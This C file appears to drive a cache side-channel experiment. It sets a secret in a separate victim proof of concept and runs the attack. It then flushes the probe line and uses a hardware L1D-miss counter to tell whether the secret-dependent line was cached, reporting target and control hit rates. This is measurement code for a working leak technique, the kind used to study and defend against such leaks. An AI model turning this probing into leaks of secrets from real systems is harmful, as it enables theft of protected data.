// auto_stage1_2_driver.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h>

// Victim PoC 接口
void vf_set_secret(uint8_t s);
void vf_run_attack_once(void);
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s);

// pmu_helper 接口
uint64_t pmu_read_l1d_miss(void);

static inline void flush_line(volatile uint8_t *addr) {
    _mm_clflush((void *)addr);
    _mm_mfence();
}

static int probe_line_via_l1d_miss(volatile uint8_t *addr) {
    _mm_lfence();
    uint64_t m0 = pmu_read_l1d_miss();
    _mm_lfence();
    (void)*addr;
    _mm_lfence();
    uint64_t m1 = pmu_read_l1d_miss();
    _mm_lfence();
    uint64_t delta = m1 - m0;
    return (delta == 0);  // 1 = hit, 0 = miss
}

/**
 * 在 secret = s 的条件下，对 target_s 和 control_s 对应的 cache line
 * 各做多次试验：
 *   - flush probe_target / probe_control；
 *   - run_attack_once();
 *   - 对 probe_target 做 L1D miss probe；
 *   - 对 probe_control 做 L1D miss probe；
 * 统计：
 *   hits_target, total_target
 *   hits_control, total_control
 */
static void stage2_round_dual(uint8_t secret,
                              uint8_t target_s,
                              int trials,
                              int *out_hits_target,  int *out_total_target,
                              int *out_hits_control, int *out_total_control)
{
    vf_set_secret(secret);
    volatile uint8_t *probe_target  = vf_get_probe_addr_for_secret(target_s);
    //volatile uint8_t *probe_control = vf_get_probe_addr_for_secret(control_s);

    int hits_t = 0, total_t = 0;
    int hits_c = 0, total_c = 0;

    for (int i = 0; i < trials; i++) {
        flush_line(probe_target);
        //flush_line(probe_control);

        // 小延迟减小重叠
        for (volatile int z = 0; z < 100; z++) {}

        vf_run_attack_once();

        for (volatile int z = 0; z < 100; z++) {}

        // 先探测 target，再探测 control
        //int hit_c = probe_line_via_l1d_miss(probe_control);
        int hit_t = probe_line_via_l1d_miss(probe_target);
        

        total_t++;
        //total_c++;
        hits_t += hit_t;
        //hits_c += hit_c;
    }

    for (int i = 0; i < trials; i++) {
        flush_line(probe_target);

        // 小延迟减小重叠
        for (volatile int z = 0; z < 100; z++) {}

        // 先探测 target，再探测 control
        int hit_c = probe_line_via_l1d_miss(probe_target);

        total_c++;
        hits_c += hit_c;
    }

    *out_hits_target   = hits_t;
    *out_total_target  = total_t;
    *out_hits_control  = hits_c;
    *out_total_control = total_c;
}

int main(int argc, char **argv)
{
    int trials = 1000;

    // 随机生成两个不同的 secret 值
    uint8_t s0, s1;

    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    unsigned int seed = (unsigned int)(ts.tv_nsec ^ ts.tv_sec);

    s0 = (uint8_t)(rand_r(&seed) & 0xFF);
    do {
        s1 = (uint8_t)(rand_r(&seed) & 0xFF);
    } while (s1 == s0);

    // Round 0: secret = s0, target = s0, control = s1
    int hits_t0, tot_t0, hits_c0, tot_c0;
    stage2_round_dual(s0, s0, trials,
                      &hits_t0, &tot_t0,
                      &hits_c0, &tot_c0);

    // Round 1: secret = s1, target = s1, control = s0
    int hits_t1, tot_t1, hits_c1, tot_c1;
    stage2_round_dual(s1, s1, trials,
                      &hits_t1, &tot_t1,
                      &hits_c1, &tot_c1);

    // 为自动化 post 处理输出结构化信息
    // Round 0
    printf("STAGE2_ROUND0_SECRET=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_HITS=%d\n", hits_t0);
    printf("STAGE2_ROUND0_TARGET_TOTAL=%d\n", tot_t0);

    printf("STAGE2_ROUND0_CONTROL_VALUE=%u\n", (unsigned)s1);
    printf("STAGE2_ROUND0_CONTROL_HITS=%d\n", hits_c0);
    printf("STAGE2_ROUND0_CONTROL_TOTAL=%d\n", tot_c0);

    // Round 1
    printf("STAGE2_ROUND1_SECRET=%u\n", (unsigned)s1);
    printf("STAGE2_ROUND1_TARGET_VALUE=%u\n", (unsigned)s1);
    printf("STAGE2_ROUND1_TARGET_HITS=%d\n", hits_t1);
    printf("STAGE2_ROUND1_TARGET_TOTAL=%d\n", tot_t1);

    printf("STAGE2_ROUND1_CONTROL_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND1_CONTROL_HITS=%d\n", hits_c1);
    printf("STAGE2_ROUND1_CONTROL_TOTAL=%d\n", tot_c1);

    // 为方便人工查看，再打印人类可读的信息
    double r0_t = (tot_t0 > 0) ? (double)hits_t0 / tot_t0 : 0.0;
    double r0_c = (tot_c0 > 0) ? (double)hits_c0 / tot_c0 : 0.0;
    double r1_t = (tot_t1 > 0) ? (double)hits_t1 / tot_t1 : 0.0;
    double r1_c = (tot_c1 > 0) ? (double)hits_c1 / tot_c1 : 0.0;

    printf("Round0: secret=%u, target=%u, control=%u, "
           "target_rate=%.3f, control_rate=%.3f\n",
           (unsigned)s0, (unsigned)s0, (unsigned)s1, r0_t, r0_c);
    printf("Round1: secret=%u, target=%u, control=%u, "
           "target_rate=%.3f, control_rate=%.3f\n",
           (unsigned)s1, (unsigned)s1, (unsigned)s0, r1_t, r1_c);

    return 0;
}